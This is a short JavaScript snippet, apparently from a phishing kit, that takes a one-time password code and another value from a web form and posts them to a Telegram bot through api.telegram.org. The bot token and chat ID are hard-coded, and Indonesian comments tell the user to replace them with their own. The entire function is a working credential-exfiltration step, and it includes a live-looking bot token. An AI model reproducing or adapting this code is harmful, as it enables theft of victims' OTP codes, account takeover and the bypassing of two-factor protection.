function kirimPesan2() 
{
var otp = document.getElementById('nama');
    
    
    var gabungan = logo.value + '%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣  :%20' + nama.value;

    var token = '7550904557:AAEMw3n2eT5wY-TeOnME6hidSuOE9bfncnI'; // Ganti dengan token bot yang kamu buat
    var grup = '7974329865'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}